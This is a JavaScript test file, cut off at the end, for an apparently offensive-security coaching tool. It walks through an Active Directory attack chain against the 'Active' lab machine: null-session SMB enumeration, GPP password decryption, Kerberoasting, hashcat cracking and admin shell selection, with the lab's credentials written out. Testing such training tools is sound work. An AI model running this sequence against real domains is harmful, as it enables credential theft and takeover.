/* Graceful dry-probe recovery & "Always Run Command #1 on Card #1" verification.
 * Proves that when an operator (including an inexperienced user) runs the #1 suggested command on Card #1:
 *   1. If the command succeeds and settles a sequential step (or produces a new fact), the card stays at #1
 *      and promotes its next sequential step to Command #1.
 *   2. If the command completes conclusively with 0 findings (a dry probe, or "Ran — Nothing Found"),
 *      moveDryTriesInEpoch increments, the card rotates below untried (0-dry-try) hypotheses in onFlow,
 *      and nsSel automatically advances so the new #1 card expands with its #1 command ready.
 *   3. Cross-card distinctive commands (e.g. `bloodyAD ... get writable`) are recognized as already tried
 *      in the same epoch/target/credential context even when run from a sibling card.
 *   4. Environment errors, partial/unknown pastes, and active blocker.* diagnostics never demote a card.
 *   5. Advancing to a new access epoch resets dry-probe counts so cards get a fresh shot under new privileges.
 */
'use strict';
const assert = require('assert');
const fs = require('fs');
const path = require('path');
const vm = require('vm');

const ROOT = path.resolve(__dirname, '../..');
const storage = () => {
  const m = new Map();
  return {
    get length() { return m.size; },
    key(i) { return Array.from(m.keys())[i] || null; },
    getItem(k) { return m.has(k) ? m.get(k) : null; },
    setItem(k, v) { m.set(k, String(v)); },
    removeItem(k) { m.delete(k); }
  };
};
const sb = {
  console,
  localStorage: storage(),
  sessionStorage: storage(),
  setTimeout() { return 1; },
  clearTimeout() {},
  Promise
};
sb.window = sb;
sb.globalThis = sb;
vm.createContext(sb);

const load = file => vm.runInContext(fs.readFileSync(path.join(ROOT, file), 'utf8'), sb, { filename: file });
['facts', 'context', 'phases', 'pack', 'command', 'profile', 'workspace', 'chain', 'outcomes', 'loot'].forEach(n => load('assets/engine/' + n + '.js'));
load('data/field-notes.js');
load('assets/ui/util.js');
load('assets/ui/icons.js');
load('assets/ui/store.js');
load('assets/engine/parsers/common.js');
['nmap', 'directory', 'creds', 'host', 'web', 'services', 'database', 'websource', 'findings', 'shape', 'pivot', 'dns', 'blockers', 'nxc-catalog', 'index']
  .forEach(n => load('assets/engine/parsers/' + n + '.js'));
load('assets/ui/ingest.js');

const O = sb.OBOL, S = O.store, F = O.facts;
const actions = O.pack.loadPacks(O.pack.PACK_NAMES.map(n => JSON.parse(fs.readFileSync(path.join(ROOT, 'data/packs', n + '.json'), 'utf8'))));
O.packs = { actions: () => actions };
O.routes = {};
load('assets/ui/routes/path.js');

let fail = 0, pass = 0;
function ok(cond, msg) {
  if (!cond) { console.error('  FAIL:', msg); fail++; }
  else { console.log('  ok  :', msg); pass++; }
}

const fact = (kind, scope, value = {}) => F.makeFact({ kind, scope, value, source: 'test' });

// Helper: extract the currently expanded card (`ns-card selected`) and its active command from `path.render()`
function renderedTopSelection() {
  const html = O.routes.path.render();
  const selMatch = html.match(/<article[^>]*class="[^"]*\bns-card\b[^"]*\bselected\b[^"]*"[^>]*data-action="([^"]+)"/);
  const selectedActionId = selMatch ? selMatch[1] : null;
  const miMatch = html.match(/<div class="move-ingest"[^>]*data-action="([^"]+)"[^>]*data-cmd="([^"]*)"/);
  const activeCmd = miMatch ? miMatch[2]
    .replace(/&quot;/g, '"')
    .replace(/&#39;/g, "'")
    .replace(/&amp;/g, '&')
    .replace(/&lt;/g, '<')
    .replace(/&gt;/g, '>') : '';
  const hasEmptyBtn = /class="[^"]*\bmi-empty\b/.test(html);
  return { html, selectedActionId, activeCmd, hasEmptyBtn };
}

(async () => {
  console.log('=== 1. Outcome Classification for Zero-Output, Negative Tool Runs & Anonymous Bind Denials ===');
  const emptyMarkerOut = O.outcomes.classify({
    text: '[OBOL: completed with no output / nothing found]',
    command: "bloodyAD --host 10.10.10.100 -d active.htb -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' get writable",
    facts: [], blockers: [], produced: []
  });
  ok(emptyMarkerOut.kind === 'completed-negative' && emptyMarkerOut.conclusive && emptyMarkerOut.retireCommand,
    '"Ran — Nothing Found" marker classifies as completed-negative and retires the command');

  const promptOnlyOut = O.outcomes.classify({
    text: "┌──(kali㉿kali)-[~/ctf]\n└─$ bloodyAD --host 10.10.10.100 -d active.htb -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' get writable\n┌──(kali㉿kali)-[~/ctf]\n└─$ ",
    command: "bloodyAD --host 10.10.10.100 -d active.htb -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' get writable",
    facts: [], blockers: [], produced: []
  });
  ok(promptOnlyOut.kind === 'completed-negative' && promptOnlyOut.conclusive && promptOnlyOut.retireCommand,
    'Prompt-only paste (0 stdout lines between prompts) classifies as completed-negative and retires the command');

  const impacketEmptyOut = O.outcomes.classify({
    text: 'Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies\n\n[-] No entries found!',
    command: "impacket-GetUserSPNs active.htb/SVC_TGS:'pw' -dc-ip 10.10.10.100 -request",
    facts: [], blockers: [], produced: []
  });
  ok(impacketEmptyOut.kind === 'completed-negative' && impacketEmptyOut.retireCommand,
    'Impacket "No entries found!" classifies as completed-negative and retires the command');

  const nxcModuleEmptyOut = O.outcomes.classify({
    text: 'LDAP        10.10.10.100    389    DC               [*] Windows Server 2008 R2 (name:DC) (domain:active.htb)\nLDAP        10.10.10.100    389    DC               [+] active.htb\\SVC_TGS:GPPstillStandingStrong2k18',
    command: "nxc ldap 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -M daclread -o ACTION=read",
    facts: [], blockers: [], produced: []
  });
  ok(nxcModuleEmptyOut.kind === 'completed-negative' && nxcModuleEmptyOut.retireCommand,
    'nxc -M module run that authenticates and produces 0 new facts classifies as completed-negative (not auth-only)');

  const ldapAnonDeniedOut = O.outcomes.classify({
    text: 'Operations error (1)\nAdditional information: 000004DC: LdapErr: DSID-0C0907C2, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v1db1',
    command: "ldapsearch -x -H ldap://10.10.10.100 -b 'DC=active,DC=htb' '(objectClass=*)'",
    facts: [], blockers: ['blocker.ldap_anonymous_disabled'], produced: ['blocker.ldap_anonymous_disabled']
  });
  ok(ldapAnonDeniedOut.kind === 'authorization-denied' && ldapAnonDeniedOut.retireCommand,
    'LDAP anonymous bind DSID-0C0907C2 denial classifies as authorization-denied and retires the command');

  console.log('\n=== 2. Sequential Multi-Step Moves Stay at #1 While Dry Probes Rotate Down ===');
  const TGT = '10.10.10.100', DOM = 'active.htb';
  await S.createEngagement('Active Lab Dry-Probe Recovery');
  S.update(e => {
    e.params = { target: TGT, domain: DOM };
    e.activeTarget = TGT;
    e.targets = [{ ip: TGT, hostname: 'DC', domain: DOM }];
    e.ui = { wsScaffoldDone: true };
  });

  // Step 1: Nmap scan on 10.10.10.100 (ports 88, 135, 139, 389, 445, 464, 3268 — no 5985!)
  O.ingest.run({
    command: 'nmap -sC -sV ' + TGT,
    text: [
      'Nmap scan report for ' + TGT,
      'Host is up (0.03s latency).',
      '88/tcp   open  kerberos-sec Microsoft Windows Kerberos',
      '135/tcp  open  msrpc        Microsoft Windows RPC',
      '139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn',
      '389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)',
      '445/tcp  open  microsoft-ds Windows Server 2008 R2 Datacenter 7601 Service Pack 1 microsoft-ds (workgroup: ACTIVE)',
      '464/tcp  open  kpasswd5?',
      '3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: active.htb)',
      'Service Info: Host: DC; OS: Windows'
    ].join('\n'),
    scope: 'host:' + TGT,
    actionId: 'nmap-quick',
    source: 'paste',
    quiet: true
  });

  let coach = O.coach.compute();
  let renderState = renderedTopSelection();
  ok(renderState.hasEmptyBtn, '#/path move-ingest renders the "Ran — Nothing Found" (mi-empty) button');
  ok(renderState.selectedActionId === coach.onFlow[0].id, '#/path expands onFlow[0] (' + coach.onFlow[0].id + ') by default');

  // Suppose the operator is on recon-smb-anon and runs Step 0 (`nxc smb 10.10.10.100 -u '' -p ''`), which proves null session!
  const smbMove = actions.find(a => a.id === 'recon-smb-anon');
  O.ingest.run({
    command: "nxc smb " + TGT + " -u '' -p ''",
    text: [
      'SMB         ' + TGT + '   445    DC               [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 (name:DC) (domain:active.htb)',
      'SMB         ' + TGT + '   445    DC               [+] active.htb\\: '
    ].join('\n'),
    scope: 'host:' + TGT,
    actionId: 'recon-smb-anon',
    source: 'paste',
    quiet: true
  });
  coach = O.coach.compute();
  const smbDryAfterStep1 = O.command.moveDryTriesInEpoch(smbMove, coach.facts, S.active(), O.pack.accessEpoch(coach.facts), TGT);
  ok(smbDryAfterStep1 === 0, 'Productive Step 0 on recon-smb-anon has moveDryTriesInEpoch === 0 (never penalized as dry)');
  const smbBestIdx = O.command.bestCommandIndex(smbMove, coach.facts, {
    params: coach.params, activities: S.active().activities, epoch: O.pack.accessEpoch(coach.facts)
  });
  ok(smbBestIdx === 1, 'recon-smb-anon advances bestCommandIndex from Step 0 (null-session probe) to Step 1 (nxc smb --shares)');

  // Step 2 on recon-smb-anon: `nxc smb 10.10.10.100 -u '' -p '' --shares` -> discovers readable `Replication` share!
  O.ingest.run({
    command: "nxc smb " + TGT + " -u '' -p '' --shares",
    text: [
      'SMB         ' + TGT + '   445    DC               [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 (name:DC) (domain:active.htb)',
      'SMB         ' + TGT + '   445    DC               [+] active.htb\\: ',
      'SMB         ' + TGT + '   445    DC               [*] Enumerated shares',
      'SMB         ' + TGT + '   445    DC               Share           Permissions     Remark',
      'SMB         ' + TGT + '   445    DC               -----           -----------     ------',
      'SMB         ' + TGT + '   445    DC               ADMIN$                          Remote Admin',
      'SMB         ' + TGT + '   445    DC               C$                              Default share',
      'SMB         ' + TGT + '   445    DC               IPC$            READ            Remote IPC',
      'SMB         ' + TGT + '   445    DC               NETLOGON                        Logon server share',
      'SMB         ' + TGT + '   445    DC               Replication     READ            ',
      'SMB         ' + TGT + '   445    DC               SYSVOL                          Logon server share',
      'SMB         ' + TGT + '   445    DC               Users                           '
    ].join('\n'),
    scope: 'host:' + TGT,
    actionId: 'recon-smb-anon',
    source: 'paste',
    quiet: true
  });
  coach = O.coach.compute();
  ok(coach.facts.has('smb.readable_share'), 'nxc --shares mints smb.readable_share for Replication');

  // Step 3: Run gpp-passwords (`nxc smb 10.10.10.100 -u '' -p '' -M gpp_password`) -> recovers SVC_TGS credential!
  O.ingest.run({
    command: "nxc smb " + TGT + " -u '' -p '' -M gpp_password",
    text: [
      'SMB         ' + TGT + '   445    DC               [*] Windows Server 2008 R2 (name:DC) (domain:active.htb)',
      'SMB         ' + TGT + '   445    DC               [+] active.htb\\: ',
      'GPP_PASS... ' + TGT + '   445    DC               [+] Foundcpassword: GPPstillStandingStrong2k18',
      'GPP_PASS... ' + TGT + '   445    DC               [+]Usernames: active.htb\\SVC_TGS',
      'SMB         ' + TGT + '   445    DC               [+] active.htb\\SVC_TGS:GPPstillStandingStrong2k18'
    ].join('\n'),
    scope: 'host:' + TGT,
    actionId: 'gpp-passwords',
    source: 'paste',
    quiet: true
  });

  // Validate SVC_TGS so we enter the authenticated (`auth`) epoch
  O.ingest.run({
    command: "nxc smb " + TGT + " -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'",
    text: 'SMB ' + TGT + ' 445 DC [+] active.htb\\SVC_TGS:GPPstillStandingStrong2k18',
    scope: 'host:' + TGT,
    actionId: 'smb-auth-validate',
    source: 'paste',
    quiet: true
  });

  coach = O.coach.compute();
  const authIds = coach.onFlow.map(a => a.id);
  const kerberoastIdx = authIds.indexOf('kerberoast');
  const bloodyIdx = authIds.indexOf('bloodyad-acl');
  const pathManualIdx = authIds.indexOf('ad-path-manual');
  ok(kerberoastIdx >= 0 && bloodyIdx >= 0 && pathManualIdx >= 0,
    'In authenticated AD epoch, bloodyad-acl, ad-path-manual, and kerberoast are all ready in onFlow');

  console.log('\n=== 3. Simulating a Dry Probe on Card #1 and Verifying Automatic Rotation + Selection Follow ===');
  const bloodyMove = coach.onFlow.find(a => a.id === 'bloodyad-acl');
  const pathManualMove = coach.onFlow.find(a => a.id === 'ad-path-manual');
  const bloodyCmd0 = O.command.fillCommand(bloodyMove, coach.facts, { params: coach.params }, 0).filled;
  ok(/bloodyAD.*get writable/.test(bloodyCmd0), 'bloodyad-acl Command #0 is bloodyAD get writable');
  ok(bloodyMove.commands.filter(c => /add dcsync|dacledit.*DCSync|isDeleted/.test(c.run)).every(c => Array.isArray(c.requires_any) && c.requires_any.includes('ad.acl_lead')),
    'bloodyad-acl cash-in commands (add dcsync, dacledit DCSync, AD recycle bin) are gated behind ad.acl_lead/ad.group_joined');

  const curEpoch = O.pack.accessEpoch(coach.facts);
  ok(O.command.moveDryTriesInEpoch(bloodyMove, coach.facts, S.active(), curEpoch, TGT) === 0,
    'bloodyad-acl starts with 0 dry tries in current epoch');

  // Simulate clicking "Ran — Nothing Found" (or pasting empty prompt output) on bloodyad-acl Command #0
  const dryRes = O.ingest.run({
    command: bloodyCmd0,
    text: '[OBOL: completed with no output / nothing found]',
    scope: 'host:' + TGT,
    actionId: 'bloodyad-acl',
    source: 'paste',
    quiet: true
  });
  ok(dryRes.outcome && dryRes.outcome.kind === 'completed-negative' && dryRes.outcome.retireCommand,
    'Dry bloodyAD get writable run records completed-negative with retireCommand: true');

  coach = O.coach.compute();
  const bloodyDryCount = O.command.moveDryTriesInEpoch(bloodyMove, coach.facts, S.active(), curEpoch, TGT);
  ok(bloodyDryCount === 1, 'bloodyad-acl now has moveDryTriesInEpoch === 1 after dry get writable run');

  // Check cross-card command deduplication: ad-path-manual's `bloodyAD ... get writable --detail` (cmd[1]) is ALSO recognized as tried!
  const pmFilled1 = O.command.fillCommand(pathManualMove, coach.facts, { params: coach.params }, 1).filled;
  const pmCmd1Tried = O.command.commandTriedInEpoch(
    pathManualMove,
    pathManualMove.commands[1],
    pmFilled1,
    S.active().activities,
    curEpoch,
    TGT,
    coach.facts.forAction(pathManualMove, pathManualMove.commands[1])._resolvedContext
  );
  ok(pmCmd1Tried === true, 'Cross-card deduplication marks `bloodyAD ... get writable --detail` on ad-path-manual as already tried');

  // Because all follow-up commands on bloodyad-acl are gated on ad.acl_lead, bloodyad-acl leaves onFlow until ad.acl_lead is found,
  // AND ad-path-manual (which shared get writable as cmd[1]) gets moveDryTriesInEpoch === 1 and rotates below all 0-dry-try cards!
  const newOrder = coach.onFlow.map(a => a.id);
  const untriedCards = coach.onFlow.filter(a => O.command.moveDryTriesInEpoch(a, coach.facts, S.active(), curEpoch, TGT) === 0).map(a => a.id);
  ok(newOrder.indexOf('bloodyad-acl') === -1 && newOrder.indexOf('ad-path-manual') >= untriedCards.length,
    'bloodyad-acl drops out of onFlow (no un-gated commands left) and ad-path-manual rotates below all 0-dry-try cards (' + newOrder.slice(0, 5).join(' -> ') + ')');

  // Now test what happens when Card #1 ITSELF (` coach.onFlow[0] `) is run and comes up dry!
  const currentTop = coach.onFlow[0];
  const secondCardBefore = coach.onFlow[1];
  const topCmd0 = O.command.fillCommand(currentTop, coach.facts, { params: coach.params }, 0).filled;
  O.ingest.run({
    command: topCmd0,
    text: '[OBOL: completed with no output / nothing found]',
    scope: 'host:' + TGT,
    actionId: currentTop.id,
    source: 'paste',
    quiet: true
  });

  coach = O.coach.compute();
  renderState = renderedTopSelection();
  ok(coach.onFlow[0].id === secondCardBefore.id,
    'When Card #1 (' + currentTop.id + ') comes up dry, Card #2 (' + secondCardBefore.id + ') automatically rotates to #1');
  ok(renderState.selectedActionId === secondCardBefore.id,
    'After Card #1 rotates down, #/path automatically expands the new #1 card (' + renderState.selectedActionId + ') instead of staying pinned to the demoted card');

  console.log('\n=== 4. Safety Invariants: Blockers, Environment Errors & Productive Follow-ups Never Demote ===');
  // Simulate a command on the new #1 card hitting an environment error (e.g. connection timeout)
  const card2 = coach.onFlow[0];
  const card2Cmd0 = O.command.fillCommand(card2, coach.facts, { params: coach.params }, 0).filled;
  const envErrRes = O.ingest.run({
    command: card2Cmd0,
    text: '[-] Connection timed out while connecting to ' + TGT,
    scope: 'host:' + TGT,
    actionId: card2.id,
    source: 'paste',
    quiet: true
  });
  ok(envErrRes.outcome.kind === 'environment-error' && !envErrRes.outcome.retireCommand,
    'Connection timeout classifies as environment-error and does NOT retire the command');
  ok(O.command.moveDryTriesInEpoch(card2, O.coach.compute().facts, S.active(), curEpoch, TGT) === 0,
    'Environment error does NOT increment moveDryTriesInEpoch (card stays at #1)');

  // Now simulate `currentTop` (which had 1 dry try earlier!) succeeding on a subsequent paste that mints a real fact:
  // e.g. kerberoast mints hash.tgs / kerberos.spn_ticket, or bloodyad-acl mints ad.acl_lead!
  O.ingest.run({
    command: bloodyCmd0,
    text: [
      'distinguishedName: CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=active,DC=htb',
      '                    msDS-AllowedToActOnBehalfOfOtherIdentity : WRITE',
      '                    ntSecurityDescriptor : WRITE'
    ].join('\n'),
    scope: 'host:' + TGT,
    actionId: 'bloodyad-acl',
    source: 'paste',
    quiet: true
  });
  coach = O.coach.compute();
  ok(coach.facts.has('ad.acl_lead'), 'Subsequent bloodyAD output mints ad.acl_lead');
  ok(O.command.moveDryTriesInEpoch(bloodyMove, coach.facts, S.active(), curEpoch, TGT) === 0,
    'Productive activity on bloodyad-acl resets its moveDryTriesInEpoch back to 0 so it can lead its next step');

  // Now test Kerberoast -> Hash Crack -> Admin Validation -> Win-Interactive-Shell on Active (no port 5985!)
  console.log('\n=== 5. Active Endgame: Kerberoast -> Crack -> Admin Shell Without Port 5985 ===');
  O.ingest.run({
    command: "impacket-GetUserSPNs active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip " + TGT + " -request",
    text: [
      'ServicePrincipalName          Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation',
      '----------------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------',
      'active/CIFS:445               Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 14:06:40.355923  2018-07-30 17:14:29.595734  ',
      '',
      '$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$11223344556677889900aabbccddeeff$' + 'a'.repeat(128)
    ].join('\n'),
    scope: 'host:' + TGT,
    actionId: 'kerberoast',
    source: 'paste',
    quiet: true
  });
  coach = O.coach.compute();
  ok(coach.facts.has('hash.tgs') || coach.facts.has('kerberos.spn_ticket'), 'Kerberoast output mints TGS hash fact');

  // Crack the TGS hash -> Administrator:Ticketmaster1968
  O.ingest.run({
    command: 'hashcat -m 13100 loot/kerberoast.hashes /usr/share/wordlists/rockyou.txt',
    text: '$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$11223344556677889900aabbccddeeff$' + 'a'.repeat(128) + ':Ticketmaster1968',
    scope: 'host:' + TGT,
    actionId: 'hash-crack',
    source: 'paste',
    quiet: true
  });
  const adminCred = O.context.credentials(S.active()).find(c => /^administrator$/i.test(c.user || ''));
  ok(adminCred && adminCred.password === 'Ticketmaster1968', 'Cracking TGS hash registers Administrator:Ticketmaster1968 credential');
  S.selectCredential(adminCred.id, TGT);

  // Validate Administrator on SMB -> (Pwn3d!) -> access.admin
  O.ingest.run({
    command: "nxc smb " + TGT + " -u 'Administrator' -p 'Ticketmaster1968'",
    text: 'SMB ' + TGT + ' 445 DC [+] active.htb\\Administrator:Ticketmaster1968 (Pwn3d!)',
    scope: 'host:' + TGT,
    actionId: 'validate-credential',
    source: 'paste',
    quiet: true
  });
  coach = O.coach.compute();
  const newAdminEpoch = O.pack.accessEpoch(coach.facts);
  ok(newAdminEpoch !== curEpoch, 'Establishing access.admin advances the access epoch (' + curEpoch + ' -> ' + newAdminEpoch + ')');

  const winShellMove = coach.onFlow.find(a => a.id === 'win-interactive-shell');
  ok(winShellMove, 'win-interactive-shell is ready in onFlow once access.admin is held');
  const winShellIdx = O.command.bestCommandIndex(winShellMove, coach.facts, {
    params: coach.params, activities: S.active().activities, epoch: newAdminEpoch
  });
  const winShellCmd = O.command.fillCommand(winShellMove, coach.facts, { params: coach.params }, winShellIdx).filled;
  ok(/(?:wmiexec|psexec)/i.test(winShellCmd) && !/evil-winrm/i.test(winShellCmd),
    'On Active (port 135/445 open, port 5985 closed), win-interactive-shell leads with impacket-wmiexec/psexec and gates out evil-winrm');

  const ewCmdObj = winShellMove.commands.find(c => /evil-winrm/i.test(c.run));
  ok(ewCmdObj && ewCmdObj.requires_port === 5985 && !O.pack.commandIsEligible(ewCmdObj, coach.facts.forAction(winShellMove, ewCmdObj), winShellMove),
    'evil-winrm command on win-interactive-shell has requires_port: 5985 and is ineligible when port 5985 is closed');

  console.log('\n=== 6. Full Novice Simulation ("Always Run Command #1 on Card #1") Through Active ===');
  await S.createEngagement('Novice Active Simulation');
  S.update(e => {
    e.params = { target: TGT };
    e.activeTarget = TGT;
    e.targets = [{ ip: TGT }];
    e.ui = { wsScaffoldDone: true };
  });
  S.addFacts([fact('target.configured', 'host:' + TGT)]);

  // Helper that simulates the novice user copying & running the #1 command on the currently expanded #1 card
  function runTopCommand(outputText) {
    const sel = renderedTopSelection();
    const topCard = O.coach.compute().onFlow[0];
    assert.ok(topCard && sel.selectedActionId === topCard.id,
      'Expanded card (' + sel.selectedActionId + ') must always equal onFlow[0] (' + (topCard && topCard.id) + ')');
    const res = O.ingest.run({
      command: sel.activeCmd,
      text: outputText,
      scope: 'host:' + TGT,
      actionId: sel.selectedActionId,
      source: 'paste',
      quiet: true
    });
    return { actionId: sel.selectedActionId, command: sel.activeCmd, res };
  }

  // Step 6.1: Initial card is recon-port-scan-fast (or nmap)
  let step = runTopCommand([
    'Nmap scan report for ' + TGT,
    'Host is up (0.03s latency).',
    '88/tcp   open  kerberos-sec Microsoft Windows Kerberos',
    '135/tcp  open  msrpc        Microsoft Windows RPC',
    '139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn',
    '389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)',
    '445/tcp  open  microsoft-ds Windows Server 2008 R2 Datacenter 7601 Service Pack 1 microsoft-ds (workgroup: ACTIVE)',
    '464/tcp  open  kpasswd5?',
    '3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: active.htb)',
    'Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1',
    'Nmap done: 1 IP address (1 host up) scanned in 12.34 seconds'
  ].join('\n'));
  ok(/nmap/.test(step.command), '6.1 Novice runs Command #1 on Card #1 (' + step.actionId + '): ' + step.command);

  // Step 6.2: Next #1 card is recon-smb-anon -> Command #1 is `nxc smb 10.10.10.100 -u '' -p ''`
  step = runTopCommand([
    'SMB         ' + TGT + '   445    DC               [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 (name:DC) (domain:active.htb)',
    'SMB         ' + TGT + '   445    DC               [+] active.htb\\: '
  ].join('\n'));
  ok(step.actionId === 'recon-smb-anon' && /nxc smb.*-u '' -p ''$/.test(step.command),
    '6.2 Novice runs Command #1 on recon-smb-anon (null session probe): ' + step.command);

  // Step 6.3: recon-smb-anon stays at #1 and promotes Command #2 (`nxc smb 10.10.10.100 -u '' -p '' --shares`)
  step = runTopCommand([
    'SMB         ' + TGT + '   445    DC               [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 (name:DC) (domain:active.htb)',
    'SMB         ' + TGT + '   445    DC               [+] active.htb\\: ',
    'SMB         ' + TGT + '   445    DC               [*] Enumerated shares',
    'SMB         ' + TGT + '   445    DC               Share           Permissions     Remark',
    'SMB         ' + TGT + '   445    DC               -----           -----------     ------',
    'SMB         ' + TGT + '   445    DC               ADMIN$                          Remote Admin',
    'SMB         ' + TGT + '   445    DC               C$                              Default share',
    'SMB         ' + TGT + '   445    DC               IPC$            READ            Remote IPC',
    'SMB         ' + TGT + '   445    DC               Replication     READ            '
  ].join('\n'));
  ok(step.actionId === 'recon-smb-anon' && /--shares/.test(step.command),
    '6.3 recon-smb-anon stays at #1 and novice runs Command #1 (--shares): ' + step.command);

  // Step 6.4a: Because Replication (not SYSVOL) is the readable share, gpp-passwords leads with share-aware smbclient mget!
  step = runTopCommand([
    'getting file \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups\\Groups.xml of size 533 as Groups.xml (17.3 KiloBytes/sec) (average 17.3 KiloBytes/sec)'
  ].join('\n'));
  ok(step.actionId === 'gpp-passwords' && /smbclient.*\/Replication.*mget \*/.test(step.command),
    '6.4a Novice runs Command #1 on gpp-passwords (share-aware smbclient mget on Replication): ' + step.command);

  // Step 6.4b: gpp-passwords advances to grep -ri "cpassword" to extract userName + cpassword from Groups.xml
  step = runTopCommand([
    './active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml:<?xml version="1.0" encoding="utf-8"?><Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\\SVC_TGS"/></User></Groups>'
  ].join('\n'));
  ok(step.actionId === 'gpp-passwords' && /grep -ri "cpassword"/.test(step.command),
    '6.4b gpp-passwords advances to grep -ri "cpassword" and extracts cpassword: ' + step.command);

  // Step 6.4c: gpp-passwords advances to gpp-decrypt with the extracted cpassword filled in!
  step = runTopCommand('GPPstillStandingStrong2k18');
  ok(step.actionId === 'gpp-passwords' && /^gpp-decrypt edBSHOwh/.test(step.command),
    '6.4c gpp-passwords advances to gpp-decrypt with filled cpassword and recovers plaintext: ' + step.command);

  // Step 6.5: Next #1 card is validate-credential to confirm the GPP-recovered SVC_TGS password against SMB!
  step = runTopCommand([
    'SMB         ' + TGT + '   445    DC               [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 (name:DC) (domain:active.htb)',
    'SMB         ' + TGT + '   445    DC               [+] active.htb\\SVC_TGS:GPPstillStandingStrong2k18 '
  ].join('\n'));
  ok(step.actionId === 'validate-credential' && /nxc smb.*SVC_TGS/.test(step.command),
    '6.5 Novice runs Command #1 on validate-credential to verify SVC_TGS: ' + step.command);

  // Step 6.6: Next #1 card is flag-hunt-windows -> Novice runs Command #1 (`nxc smb ... --spider Users ...`) which locates user.txt!
  step = runTopCommand([
    'SMB         ' + TGT + '   445    DC               [+] active.htb\\SVC_TGS:GPPstillStandingStrong2k18',
    'SMB         ' + TGT + '   445    DC               //' + TGT + '/Users/SVC_TGS/Desktop/user.txt [lastm:\'2018-07-18 19:21\' size:32]'
  ].join('\n'));
  ok(step.actionId === 'flag-hunt-windows',
    '6.6 Novice runs Command #1 on flag-hunt-windows (' + step.command + ') and locates user.txt');

  // Step 6.7: flag-hunt-windows stays at #1 and promotes the smbclient download/read command to capture user.txt!
  step = runTopCommand('a1b2c3d4e5f60718293a4b5c6d7e8f90');
  ok(step.actionId === 'flag-hunt-windows' && /smbclient.*get.*user\.txt/.test(step.command) && S.factSetForTarget(TGT).has('objective.local_flag'),
    '6.7 flag-hunt-windows stays at #1 and novice captures user.txt with Command #1: ' + step.command);

  // Step 6.8: Next #1 card is bloodyad-acl -> Novice runs Command #1 (`bloodyAD ... get writable --detail`), which returns nothing on Active!
  step = runTopCommand('[OBOL: completed with no output / nothing found]');
  ok(step.actionId === 'bloodyad-acl' && /bloodyAD.*get writable/.test(step.command),
    '6.8 Novice runs Command #1 on bloodyad-acl (dry probe on Active): ' + step.command);

  // Step 6.9: Suppose novice skips/runs dry on bloodhound-collect and smb-share-browse-download — verify kerberoast rotates to #1!
  while (renderedTopSelection().selectedActionId !== 'kerberoast') {
    const curId = renderedTopSelection().selectedActionId;
    runTopCommand('[OBOL: completed with no output / nothing found]');
    const nextId = renderedTopSelection().selectedActionId;
    assert.notStrictEqual(nextId, curId, 'Dry probe on ' + curId + ' must rotate to a new #1 card (got ' + nextId + ')');
  }
  step = runTopCommand([
    'ServicePrincipalName          Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation',
    '----------------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------',
    'active/CIFS:445               Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,htb     2018-07-18 14:06:40.355923  2018-07-30 17:14:29.595734  ',
    '',
    '$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$11223344556677889900aabbccddeeff$' + 'a'.repeat(128)
  ].join('\n'));
  ok(step.actionId === 'kerberoast',
    '6.9 Novice reaches kerberoast at #1 after dry probes rotate down, and captures Administrator TGS hash: ' + step.command);

  // Step 6.10: Cracking the TGS hash immediately jumps to #1 (`crack-tgs`)!
  step = runTopCommand('$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$11223344556677889900aabbccddeeff$' + 'a'.repeat(128) + ':Ticketmaster1968');
  ok(step.actionId === 'crack-tgs' && /hashcat.*13100/.test(step.command),
    '6.10 crack-tgs immediately jumps to #1 and novice cracks Administrator password with Command #1: ' + step.command);

  // Step 6.11: flag-hunt-root-windows jumps to #1 (via credential_probe for Administrator) and leads with remote nxc wmi probe!
  step = runTopCommand([
    'WMI         ' + TGT + '   135    DC               [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 (name:DC) (domain:active.htb)',
